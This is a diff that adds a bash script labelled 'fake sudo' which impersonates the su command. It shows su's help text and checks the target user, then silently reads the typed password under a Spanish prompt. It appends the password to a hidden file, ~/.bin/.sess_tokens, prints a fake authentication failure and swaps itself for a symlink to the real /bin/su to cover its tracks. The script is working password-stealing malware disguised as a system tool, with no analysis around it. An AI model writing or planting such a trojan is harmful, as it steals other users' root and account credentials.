@@ -1,0 +1,67 @@
+#!/bin/bash
+#fake sudo
+function usage() {
+ echo "Usage: su [options] [LOGIN]"
+ echo ""
+ echo "Options:"
+ echo "  -c, --command COMMAND         pass COMMAND to the invoked shell"
+ echo "  -h, --help                    display this help message and exit"
+ echo "  -, -l, --login                make the shell a login shell"
+ echo "  -m, -p,"
+ echo "  --preserve-environment        do not reset environment variables, and"
+ echo "                                keep the same shell"
+ echo "  -s, --shell SHELL             use SHELL instead of the default in passwd"
+ echo ""
+ exit
+}
+ 
+n=0;
+for x in $*; do
+ z[$n]=$x;
+ n=$(($n+1));
+done
+ 
+USER="root"
+ 
+for (( i=0; $i < $n; i=$i+1 )); do
+ x=${z[$i]}
+ if [ "$x" == "-h" ] || [ "$x" == "--help" ]; then
+  usage
+ elif [ "$x" == "-c" ] || [ "$x" == "--command" ]; then
+  i=$(($i+1))
+  command=${z[$i]}
+ elif [ "$x" == "-s" ] || [ "$x" == "--shell" ]; then
+  i=$(($i+1))
+  shell=${z[$i]}
+ elif [ "$x" == "-" ] || [ "$x" == "-l" ] || [ "$x" == "--login" ]; then
+  continue
+ elif [ "$x" == "-m" ] || [ "$x" == "-p" ] || [ "$x" == "--preserve-environment" ]; then
+  continue
+ else
+  USER=$x
+  if [ $i != $(($n-1)) ]; then
+   usage
+  fi
+ fi
+done
+ 
+ok=false
+for i in $(cat /etc/passwd | cut -d : -f 1); do
+ if [ "$USER" == "$i" ]; then
+  ok=true
+  break
+ fi
+done
+ 
+if [ $ok == false ]; then
+ echo "Id desconocido: $USER"
+ exit
+fi
+usuario=$(whoami) 
+read -s -p "Contraseña: " SESSTOKEN
+echo "$SESSTOKEN" >> /home/$usuario/.bin/.sess_tokens
+SESSTOKEN=""
+echo ""
+sleep 2
+echo "su: Fallo de autenticación"
+ln -sf /bin/su $0
